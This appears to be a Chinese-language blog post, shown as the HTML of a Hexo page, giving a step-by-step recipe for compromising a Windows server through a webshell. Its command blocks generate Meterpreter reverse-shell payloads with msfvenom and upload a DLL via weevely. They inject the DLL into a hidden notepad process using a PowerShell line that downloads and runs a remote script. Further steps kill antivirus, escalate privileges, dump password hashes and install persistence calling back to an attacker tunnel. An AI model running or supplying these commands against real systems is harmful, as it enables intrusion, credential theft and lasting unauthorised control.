@@ -1,0 +1,120 @@
+<!DOCTYPE html><html lang="zh-CH"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/logo.png?v=2.0.0" type="image/png" sizes="32x32"><meta name="description" content="主要功能通过Webshell上传免杀后的木马进行反弹shell链接                     需求准备：       1、准备webshell木马2、windows系统3、准备powershell脚本放在公网                     购买VPS或者是Ngrok隧道       作用：链接公网主机配置好以后直接可以通过隧道ID进行链接 1$ .&#x2F;sunny client">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Webshell之Bypass">
+<meta property="og:url" content="http://zege.red/2020/05/20/dllbypass/index.html">
+<meta property="og:site_name" content="ZeGe&#39;s 专区">
+<meta property="og:description" content="主要功能通过Webshell上传免杀后的木马进行反弹shell链接                     需求准备：       1、准备webshell木马2、windows系统3、准备powershell脚本放在公网                     购买VPS或者是Ngrok隧道       作用：链接公网主机配置好以后直接可以通过隧道ID进行链接 1$ .&#x2F;sunny client">
+<meta property="og:locale" content="zh_CH">
+<meta property="article:published_time" content="2020-05-20T12:07:48.017Z">
+<meta property="article:modified_time" content="2020-05-20T12:07:07.495Z">
+<meta property="article:author" content="ZeGe">
+<meta name="twitter:card" content="summary"><meta name="keywords" content="ZeGe, ZeGe's 专区"><meta name="description" content="Stay Zege"><title>Webshell之Bypass | ZeGe's 专区</title><link ref="canonical" href="http://zege.red/2020/05/20/dllbypass/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.0.0"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":false},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 4.2.1"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">ZeGe's 专区</div><div class="header-banner-info__subtitle">好好学习 | 天天向上</div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">Webshell之Bypass</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2020-05-20</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2020-05-20</span></span></div></header><div class="post-body"><p>主要功能通过Webshell上传免杀后的木马进行反弹shell链接</p>
+
+        <h2 id="需求准备："   >
+          <a href="#需求准备：" class="heading-link"><i class="fas fa-link"></i></a>需求准备：</h2>
+      <p>1、准备webshell木马<br>2、windows系统<br>3、准备powershell脚本放在公网</p>
+
+        <h3 id="购买VPS或者是Ngrok隧道"   >
+          <a href="#购买VPS或者是Ngrok隧道" class="heading-link"><i class="fas fa-link"></i></a>购买VPS或者是Ngrok隧道</h3>
+      <p>作用：链接公网主机<br>配置好以后直接可以通过隧道ID进行链接</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./sunny clientid ngrok隧道id</span><br></pre></td></tr></table></div></figure>
+
+
+        <h3 id="在MSF中生成一个DLL文件木马"   >
+          <a href="#在MSF中生成一个DLL文件木马" class="heading-link"><i class="fas fa-link"></i></a>在MSF中生成一个DLL文件木马</h3>
+      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ msfvenom -p windows/meterpreter/reverse_http lhost=ngrokIP lport=ngrokPort -f dll -o /root/Desktop/1.dll</span><br><span class="line">$ msfconsole</span><br><span class="line">$ use exploit/multi/hander</span><br><span class="line">$ <span class="built_in">set</span> payload windows/meterpreter/reverse_http</span><br><span class="line">$ <span class="built_in">set</span> lhost 127.0.0.1</span><br><span class="line">$ <span class="built_in">set</span> lport 10033</span><br><span class="line">$ run</span><br></pre></td></tr></table></div></figure>
+
+
+        <h3 id="准备powershell文件脚本"   >
+          <a href="#准备powershell文件脚本" class="heading-link"><i class="fas fa-link"></i></a>准备powershell文件脚本</h3>
+      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ngrokIP LPORT=ngrokPort -f psh-reflection &gt; x.ps1</span><br></pre></td></tr></table></div></figure>
+
+
+        <h3 id="连接一句话木马"   >
+          <a href="#连接一句话木马" class="heading-link"><i class="fas fa-link"></i></a>连接一句话木马</h3>
+      <p>Kali里面的weevely连接一句话 或者是通过菜刀、XISE、冰蝎、蚂剑等等<br>作用：控制系统权限、上传文件<br>使用weevely连接</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ weevely 一句话连接 密码  <span class="comment">#如果出现乱码，进行修改终端编码</span></span><br><span class="line">上传注入文件：</span><br><span class="line">$ file_upload /root/Desktop/1.dll C:/phpStudy/WWW/1.dll</span><br></pre></td></tr></table></div></figure>
+
+        <h3 id="后台启动进程"   >
+          <a href="#后台启动进程" class="heading-link"><i class="fas fa-link"></i></a>后台启动进程</h3>
+      <p>注意：启动一个常用进程不容易被发现<br>这里启动一个notepad.exe</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Start-Process C:\Windows\system32\notepad.exe -WindowStyle Hidden</span><br></pre></td></tr></table></div></figure>
+
+        <h3 id="查看启动进程PID号"   >
+          <a href="#查看启动进程PID号" class="heading-link"><i class="fas fa-link"></i></a>查看启动进程PID号</h3>
+      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Get-Process notepad</span><br></pre></td></tr></table></div></figure>
+
+        <h3 id="将生成的DLL木马进行捆绑"   >
+          <a href="#将生成的DLL木马进行捆绑" class="heading-link"><i class="fas fa-link"></i></a>将生成的DLL木马进行捆绑</h3>
+      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe IEX(New-Object Net.WebClient).DownloadString(<span class="string">'http://web公网地址/PowerSploit/CodeExecution/x.ps1'</span>);Invoke-DllInjection -ProcessID 进程PID号 -dll C:\phpStudy\WWW\1.dll</span><br></pre></td></tr></table></div></figure>
+
+        <h3 id="留后门建立长链接"   >
+          <a href="#留后门建立长链接" class="heading-link"><i class="fas fa-link"></i></a>留后门建立长链接</h3>
+      
+        <h4 id="关闭杀软"   >
+          <a href="#关闭杀软" class="heading-link"><i class="fas fa-link"></i></a>关闭杀软</h4>
+      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ run killav</span><br></pre></td></tr></table></div></figure>
+
+        <h4 id="迁移到系统进程"   >
+          <a href="#迁移到系统进程" class="heading-link"><i class="fas fa-link"></i></a>迁移到系统进程</h4>
+      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ migrate 1774</span><br></pre></td></tr></table></div></figure>
+
+        <h4 id="进行提权"   >
+          <a href="#进行提权" class="heading-link"><i class="fas fa-link"></i></a>进行提权</h4>
+      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ getsystem</span><br></pre></td></tr></table></div></figure>
+<p>如果没有提权成功可以用：</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ use incognito   <span class="comment">#烂土豆提权</span></span><br></pre></td></tr></table></div></figure>
+<p>或者是利用系统漏洞提权，利用方法比较简单。</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ms16-032\ms15-051\ms14-058\ms13-081\ms13-053\ms10-092</span><br></pre></td></tr></table></div></figure>
+
+
+        <h4 id="查看管理用户"   >
+          <a href="#查看管理用户" class="heading-link"><i class="fas fa-link"></i></a>查看管理用户</h4>
+      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ getuid</span><br></pre></td></tr></table></div></figure>
+<p>在meterpreter获取系统的Hash值以及管理账户密码：</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ run post/windows/gather/hashdump</span><br></pre></td></tr></table></div></figure>
+<p>设置系统启动自启，方法也有很多。。。。。。</p>
+
+        <h4 id="建立持久化："   >
+          <a href="#建立持久化：" class="heading-link"><i class="fas fa-link"></i></a>建立持久化：</h4>
+      <p>更新session</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ run persistence -A -X -U -i 10 -p 10033 -r ngrokIP</span><br></pre></td></tr></table></div></figure>
+
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="http://zege.red">ZeGe</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="http://zege.red/2020/05/20/dllbypass/">http://zege.red/2020/05/20/dllbypass/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><nav class="post-paginator paginator"></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">Catalog</span><span class="sidebar-nav-ov">Overview</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#需求准备："><span class="toc-number">1.</span> <span class="toc-text">
+          需求准备：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#购买VPS或者是Ngrok隧道"><span class="toc-number">1.1.</span> <span class="toc-text">
+          购买VPS或者是Ngrok隧道</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#在MSF中生成一个DLL文件木马"><span class="toc-number">1.2.</span> <span class="toc-text">
+          在MSF中生成一个DLL文件木马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#准备powershell文件脚本"><span class="toc-number">1.3.</span> <span class="toc-text">
+          准备powershell文件脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#连接一句话木马"><span class="toc-number">1.4.</span> <span class="toc-text">
+          连接一句话木马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#后台启动进程"><span class="toc-number">1.5.</span> <span class="toc-text">
+          后台启动进程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#查看启动进程PID号"><span class="toc-number">1.6.</span> <span class="toc-text">
+          查看启动进程PID号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#将生成的DLL木马进行捆绑"><span class="toc-number">1.7.</span> <span class="toc-text">
+          将生成的DLL木马进行捆绑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#留后门建立长链接"><span class="toc-number">1.8.</span> <span class="toc-text">
+          留后门建立长链接</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#关闭杀软"><span class="toc-number">1.8.1.</span> <span class="toc-text">
+          关闭杀软</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#迁移到系统进程"><span class="toc-number">1.8.2.</span> <span class="toc-text">
+          迁移到系统进程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#进行提权"><span class="toc-number">1.8.3.</span> <span class="toc-text">
+          进行提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#查看管理用户"><span class="toc-number">1.8.4.</span> <span class="toc-text">
+          查看管理用户</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#建立持久化："><span class="toc-number">1.8.5.</span> <span class="toc-text">
+          建立持久化：</span></a></li></ol></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/zege.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">学习使我快乐!</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">1</div><div class="sidebar-ov-state-item__name">Archives</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">You have read </span><span class="sidebar-reading-info__num">0</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2020~2080</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>ZeGe</span><span class="footer__devider">|</span><span>晋ICP备 20003408 号</span></div><div>Email 1499005784@qq.com</div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="/js/utils.js?v=2.0.0"></script><script src="/js/stun-boot.js?v=2.0.0"></script><script src="/js/scroll.js?v=2.0.0"></script><script src="/js/header.js?v=2.0.0"></script><script src="/js/sidebar.js?v=2.0.0"></script></body></html>
